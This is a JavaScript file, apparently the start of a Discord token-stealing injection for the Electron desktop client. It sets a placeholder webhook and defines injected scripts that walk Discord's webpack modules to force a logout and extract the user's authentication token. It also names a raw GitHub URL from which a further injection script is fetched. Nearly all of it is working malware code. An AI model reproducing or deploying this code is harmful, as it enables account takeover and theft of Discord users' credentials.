const { BrowserWindow, session } = require('electron');
const { execSync } = require("node:child_process");
const { parse } = require("node:querystring");
const path = require("node:path");
const fs = require("node:fs");

const webhook = '%WEBHOOK%';

const [LOGOUT_SCRIPT, TOKEN_SCRIPT, INJECT_URL] = [
    "window.webpackJsonp ? (gg = window.webpackJsonp.push([[], { get_require: (a, b, c) => a.exports = c }, [['get_require']]]), delete gg.m.get_require, delete gg.c.get_require) : window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push([[Math.random()], {}, a => { gg = a }]);" +
    "function LogOut() {" +
    "    (function(a) {" +
    "        const b = typeof a === 'string' ? a : null;" +
    "        for (const c in gg.c) {" +
    "            if (gg.c.hasOwnProperty(c)) {" +
    "                const d = gg.c[c].exports;" +
    "                if (d && d.__esModule && d.default && (b ? d.default[b] : a(d.default))) return d.default;" +
    "                if (d && (b ? d[b] : a(d))) return d;" +
    "            }" +
    "        }" +
    "        return null;" +
    "    })('login').logout();" +
    "} LogOut();",
    
    "for (let a in window.webpackJsonp ? (gg = window.webpackJsonp.push([[], { get_require: (a, b, c) => a.exports = c }, [['get_require']]]), delete gg.m.get_require, delete gg.c.get_require) : window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push([[Math.random()], {}, a => { gg = a }]), gg.c) {" +
    "    if (gg.c.hasOwnProperty(a)) {" +
    "        let b = gg.c[a].exports;" +
    "        if (b && b.__esModule && b.default) {" +
    "            for (let prop in b.default) {" +
    "                if (prop === 'getToken') {" +
    "                    token = b.default.getToken();" +
    "                }" +
    "            }" +
    "        }" +
    "    }" +
    "} token;",
    
    "https://raw.githubusercontent.com/xnayx/discord-injection/main/myInjection.js"
];
